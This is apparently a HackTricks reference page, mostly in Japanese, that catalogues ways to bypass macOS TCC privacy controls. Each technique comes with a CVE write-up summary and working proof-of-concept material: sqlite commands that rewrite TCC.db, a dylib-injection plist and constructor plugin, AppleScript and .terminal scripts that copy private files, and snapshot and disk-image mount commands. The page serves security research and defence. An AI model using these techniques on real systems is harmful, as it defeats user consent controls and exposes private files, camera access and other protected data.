# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## 機能別

### Write Bypass

これは bypass ではなく、TCC の仕組みです。**書き込みは保護されません**。Terminal にユーザーの Desktop を読み取るアクセス権が**なくても、Desktop に書き込むことはできます**。
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**拡張属性 `com.apple.macl`** は、新しい **file** に追加され、**creators app** にその読み取りアクセス権を与えます。

### TCC ClickJacking

**TCC prompt の上にウィンドウを配置**し、ユーザーが気づかないまま **accept** させることが可能です。PoC は [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** にあります。**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### 任意の名前による TCC Request

Attacker は、**`Info.plist` に任意の名前**（Finder、Google Chrome など）を持つ **apps** を作成し、TCC で保護された場所へのアクセスを要求させることができます。ユーザーは、正規のアプリケーションがこのアクセスを要求していると思い込むでしょう。\
さらに、**Dock から正規の app を削除して fake one を配置する**ことも可能です。そのため、ユーザーが fake one（同じアイコンも使用可能）をクリックすると、正規の app を呼び出し、TCC permissions を要求して malware を実行できます。これにより、ユーザーは正規の app がアクセスを要求したと信じてしまいます。

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

詳細情報と PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

デフォルトでは、**SSH 経由のアクセスには以前「Full Disk Access」が付与されていました**。これを無効にするには、一覧に追加したまま無効化する必要があります（一覧から削除しても、これらの権限は削除されません）。

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

ここでは、**malwares がこの保護を bypass できた事例**を確認できます。

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> 現在、SSH を有効化するには **Full Disk Access** が必要です。

### Handle extensions - CVE-2022-26767

属性 **`com.apple.macl`** は、**特定の application にそのファイルの読み取り権限を与えるために**ファイルへ付与されます。この属性は、ファイルを app 上に **drag\&drop** したとき、またはユーザーがファイルを **double-click** して **default application** で開いたときに設定されます。

したがって、ユーザーは **すべての拡張子を処理する malicious app を登録**し、Launch Services を呼び出して任意のファイルを **open** させることができます（これにより malicious file に読み取りアクセス権が付与されます）。

### iCloud

entitlement **`com.apple.private.icloud-account-access`** により、**iCloud tokens を提供する** **`com.apple.iCloudHelper`** XPC service と通信できます。

**iMovie** と **Garageband** には、この entitlement と、それを可能にするその他の entitlement がありました。

その entitlement から **icloud tokens を取得する** exploit の詳細については、次の talk を確認してください: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission を持つ app は、**他の Apps を control** できます。つまり、**他の Apps に付与された permissions を abuse** できる可能性があります。

Apple Scripts の詳細については、次を確認してください:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

たとえば、ある App が **`iTerm` に対する Automation permission** を持っている場合、この例では **`Terminal`** が iTerm にアクセスできます。

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA を持たない Terminal は、FDA を持つ iTerm を呼び出し、それを使って actions を実行できます:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder経由

または、AppがFinder経由でアクセス権を持っている場合、次のようなscriptを実行できます。
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Appごとの動作

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland の **tccd daemon** は、**`HOME`** **env** variable を使用して、次の場所にある TCC users database にアクセスしていました: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[この Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) によると、また TCC daemon は現在のユーザーの domain 内で `launchd` 経由で実行されているため、TCC daemon に渡される **すべての environment variables を control** することが可能です。\
したがって、**attacker は `launchctl` で `$HOME` environment variable** を **controlled** **directory** を指すように設定し、**TCC** daemon を **restart** してから、TCC database を **直接 modify** することで、end user に一度も prompt を表示させることなく、自身に利用可能な **すべての TCC entitlement** を付与できました。\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes は TCC で保護された場所にアクセスできましたが、note が作成されると、これは **保護されていない場所に作成されます**。そのため、Notes に保護されたファイルを note 内にコピーするよう要求し（つまり保護されていない場所にコピーさせ）、その後ファイルにアクセスできました：

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

ライブラリ `libsecurity_translocate` を使用するバイナリ `/usr/libexec/lsd` には、**nullfs** mount の作成を可能にする entitlement `com.apple.private.nullfs_allow` があり、さらに **`kTCCServiceSystemPolicyAllFiles`** によってすべてのファイルへのアクセスを可能にする entitlement `com.apple.private.tcc.allow` がありました。

"Library" に quarantine attribute を追加し、**`com.apple.security.translocation`** XPC service を呼び出すと、Library が **`$TMPDIR/AppTranslocation/d/d/Library`** に map され、Library 内のすべてのドキュメントに **アクセス**できました。

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** には興味深い機能があります。実行中、**`~/Music/Music/Media.localized/Automatically Add to Music.localized`** にドロップされたファイルを、ユーザーの "media library" に **import** します。さらに、次のような処理を呼び出します：**`rename(a, b);`**。ここで `a` と `b` は次のとおりです：

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

この **`rename(a, b);`** の **Race Condition** は脆弱です。`Automatically Add to Music.localized` フォルダー内に偽の **TCC.db** ファイルを配置し、新しいフォルダー (b) が作成されたときにファイルをコピーして削除し、**`~/Library/Application Support/com.apple.TCC`**/ を指すようにできるためです。
**詳細情報は** [**writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html) **を参照してください。**


### SQLITE_SQLLOG_DIR - CVE-2023-32422

**`SQLITE_SQLLOG_DIR="path/folder"`** は基本的に、**open された db はすべてその path にコピーされる**ことを意味します。この CVE では、この control を悪用して、FDA を持つ process によって TCC database として **open** される **SQLite database** 内に **write** し、その後、filename 内の **symlink** とともに **`SQLITE_SQLLOG_DIR`** を悪用しました。これにより、その database が **open** されたとき、ユーザーの **TCC.db が open された database で上書き**されます。\
**詳細情報は** [**writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **および**[ **talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s) **を参照してください。**

### **SQLITE_AUTO_TRACE**

環境変数 **`SQLITE_AUTO_TRACE`** が設定されている場合、ライブラリ **`libsqlite3.dylib`** はすべての SQL query の **logging** を開始します。多くの application がこのライブラリを使用していたため、それらの SQLite query をすべて log できました。

複数の Apple application が、このライブラリを使用して TCC で保護された情報にアクセスしていました。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

この **env variable は `Metal` framework によって使用されます**。`Metal` framework はさまざまなプログラムの dependency であり、特に FDA を持つ `Music` で使用されます。

以下を設定します: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`。`path` が有効な directory の場合、bug が trigger され、`fs_usage` を使ってプログラム内で何が起きているか確認できます:

- `path/.dat.nosyncXXXX.XXXXXX` という名前の file が `open()` される（X は random）
- 1 回以上の `write()` により file に contents が書き込まれる（これは control できません）
- `path/.dat.nosyncXXXX.XXXXXX` が `path/name` に `renamed()` される

これは temporary file への write の後に、**secure ではない **`rename(old, new)`** が実行されます。**

secure ではない理由は、old と new の paths を個別に **resolve する必要があり**、これには時間がかかる場合があり、Race Condition に対して vulnerable になり得るためです。詳細については、`xnu` の function `renameat_internal()` を確認してください。

> [!CAUTION]
> 基本的に、privileged process があなたの control 下にある folder から rename している場合、RCE に成功し、別の file に access させることができます。または、この CVE のように、privileged app が作成した file を open させて FD を保存できます。
>
> rename があなたの control 下にある folder に access する場合、source file を変更している、またはその file への FD を持っている間に、destination file（または folder）が symlink を指すように変更できます。これにより、任意のタイミングで write できます。

これが CVE で使われた attack です。例えば、ユーザーの `TCC.db` を overwrite するには、次の操作を行います:

- `/Users/hacker/ourlink` を作成し、`/Users/hacker/Library/Application Support/com.apple.TCC/` を指すようにする
- directory `/Users/hacker/tmp/` を作成する
- `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` を設定する
- この env var を使って `Music` を実行し、bug を trigger する
- `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` の `open()` を捕捉する（X は random）
- ここで、この file を write 用に `open()` し、file descriptor を保持する
- `/Users/hacker/tmp` と `/Users/hacker/ourlink` を **loop 内で atomic に切り替える**
- race window がかなり短いため成功する可能性を最大化するためにこれを行う。ただし、race に負けても downside はほとんどない
- 少し待つ
- 成功したか確認する
- 成功していなければ、最初から再実行する

詳細は [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html) を参照してください。

> [!CAUTION]
> 現在、env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE` を使用しようとすると、apps は launch しません。

### Apple Remote Desktop

root としてこの service を enable すると、**ARD agent が full disk access を持つ**ようになり、ユーザーがこれを abuse して新しい **TCC user database** を copy できるようになります。

## By **NFSHomeDirectory**

TCC は、ユーザー固有の resources への access を control するため、ユーザーの HOME folder 内にある database、**$HOME/Library/Application Support/com.apple.TCC/TCC.db** を使用します。\
したがって、ユーザーが `$HOME` env variable に **different folder** を指定した状態で TCC を restart させることができれば、ユーザーは **/Library/Application Support/com.apple.TCC/TCC.db** に新しい TCC database を作成し、TCC を trick して任意の app に任意の TCC permission を grant させることができます。

> [!TIP]
> Apple は、ユーザーの profile に保存された **`NFSHomeDirectory`** attribute の setting を **`$HOME` の value** として使用することに注意してください。そのため、この value を modify する permission（**`kTCCServiceSystemPolicySysAdminFiles`**）を持つ application を compromise できれば、この option を TCC bypass として **weaponize** できます。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**first POC** は [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) と [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) を使用して、ユーザーの **HOME** folder を modify します。

1. target app 用の _csreq_ blob を取得する。
2. 必要な access と _csreq_ blob を含む fake _TCC.db_ file を plant する。
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) を使用して、ユーザーの Directory Services entry を export する。
4. Directory Services entry を modify し、ユーザーの home directory を変更する。
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) を使用して、modify した Directory Services entry を import する。
6. ユーザーの _tccd_ を stop し、process を reboot する。

2 つ目の POC は、value `kTCCServiceSystemPolicySysAdminFiles` を持つ `com.apple.private.tcc.allow` を備えた **`/usr/libexec/configd`** を使用しました。\
**`configd`** は **`-t`** option を指定して実行でき、attacker は **load する custom Bundle** を指定できました。そのため、この exploit では、ユーザーの home directory を変更する **`dsexport`** および **`dsimport`** method を **`configd` code injection** に置き換えます。

詳細は [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) を参照してください。

## By process injection

process 内に code を inject し、その TCC privileges を abuse する techniques は複数存在します:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

さらに、TCC bypass で最も一般的に見つかる process injection は、**plugins (load library)** 経由のものです。\
Plugins は通常、libraries または plist の形式の extra code であり、**main application によって load され**、その context 内で execute されます。したがって、main application が TCC restricted files に access できる場合（granted permissions または entitlements 経由）、**custom code も同じ access を持つ**ことになります。

### CVE-2020-27937 - Directory Utility

application `/System/Library/CoreServices/Applications/Directory Utility.app` は entitlement **`kTCCServiceSystemPolicySysAdminFiles`** を持ち、**`.daplug`** extension の plugins を load し、hardened runtime を **持っていませんでした**。

この CVE を weaponize するには、TCC を bypass するため、（前述の entitlement を abuse して）**`NFSHomeDirectory`** を **変更**し、ユーザーの TCC database を **take over** できるようにします。

詳細は [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) を参照してください。

### CVE-2020-29621 - Coreaudiod

binary **`/usr/sbin/coreaudiod`** は entitlements `com.apple.security.cs.disable-library-validation` と `com.apple.private.tcc.manager` を持っていました。前者は **code injection を可能にし**、後者は **TCC を manage する access** を与えます。

この binary は folder `/Library/Audio/Plug-Ins/HAL` から **third party plug-ins** を load できました。そのため、plugin を **load して TCC permissions を abuse** することが可能でした。この PoC を使用します:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
詳細については、[**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) を確認してください。

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O 経由でカメラストリームを開くシステムアプリケーション（**`kTCCServiceCamera`** を持つアプリ）は、`/Library/CoreMediaIO/Plug-Ins/DAL` にあるこれらのプラグインをプロセス内にロードします（SIP の制限対象外）。

そこに一般的な **constructor** を含むライブラリを保存するだけで、**コードを inject** できます。

複数の Apple アプリケーションがこの脆弱性の影響を受けました。

### Firefox

Firefox アプリケーションには、`com.apple.security.cs.disable-library-validation` と `com.apple.security.cs.allow-dyld-environment-variables` の entitlements がありました。
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
さらに詳しい情報や、この手法を簡単に exploit する方法については、[**original report を確認してください**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。

### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` には **`com.apple.private.tcc.allow`** および **`com.apple.security.get-task-allow`** の entitlements が設定されていました。これにより、プロセス内へ code を inject し、TCC privileges を使用できました。

### CVE-2023-26818 - Telegram

Telegram には **`com.apple.security.cs.allow-dyld-environment-variables`** および **`com.apple.security.cs.disable-library-validation`** の entitlements が設定されていたため、これを abuse して、camera recording などの **Telegram の permissions に access** できました。[**payload は writeup で確認できます**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

環境変数を使用して library を load する方法に注目してください。この library を inject するために **custom plist** が作成され、それを launch するために **`launchctl`** が使用されました：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## openの呼び出しによる方法

sandbox内であっても **`open`** を呼び出すことが可能です。

### Terminal Scripts

少なくとも技術者が使用するコンピューターでは、Terminalに **Full Disk Access (FDA)** を付与することは比較的一般的です。そして、それを利用して **`.terminal`** スクリプトを呼び出すことが可能です。

**`.terminal`** スクリプトは、実行するコマンドを **`CommandString`** キーに含む、次のようなplistファイルです：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
アプリケーションは、/tmp のような場所にターミナルスクリプトを書き込み、次のようなコマンドで起動できます。
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## マウントによる

### CVE-2020-9771 - mount_apfs TCC bypass と privilege escalation

**Any user**（権限のないユーザーでも）が Time Machine snapshot を作成してマウントし、その snapshot の**全てのファイルにアクセス**できます。\
必要な**唯一の権限**は、使用するアプリケーション（`Terminal` など）に **Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）が付与されていることです。これは管理者によって付与される必要があります。
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
より詳細な説明は[**元のレポートに記載されています**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - TCC fileへのマウント

TCC DB fileが保護されていても、**directoryに新しいTCC.db fileをmountする**ことが可能でした：
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**full exploit**は[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/)で確認できます。

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)で説明されているように、このCVEは`diskarbitrationd`を悪用しました。

公開されている`DiskArbitration` frameworkの`DADiskMountWithArgumentsCommon`関数がsecurity checksを実行していました。しかし、`diskarbitrationd`を直接呼び出すことでこれをbypassでき、その結果、path内で`../`要素やsymlinkを使用できました。

これにより、攻撃者は任意の場所に任意のmountを実行できました。これには、`diskarbitrationd`のentitlement`com.apple.private.security.storage-exempt.heritable`により、TCC databaseへのmountも含まれます。

### asr

**`/usr/sbin/asr`** toolを使用すると、ディスク全体をcopyして別の場所にmountし、TCC protectionsをbypassできました。

### Location Services

**location servicesへのアクセス**を許可されたclientsを示す、3つ目のTCC databaseが**`/var/db/locationd/clients.plist`**にあります。\
**`/var/db/locationd/` folderはDMG mountingから保護されていなかった**ため、独自のplistをmountできました。

## startup appsによる方法


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grepによる方法

複数のケースで、filesはemails、phone numbers、messagesなどのsensitive informationを、protectedではないlocationsに保存します（Appleではこれをvulnerabilityとして扱います）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

これはもう機能しませんが、[**過去には機能していました**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)を使用する別の方法:

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
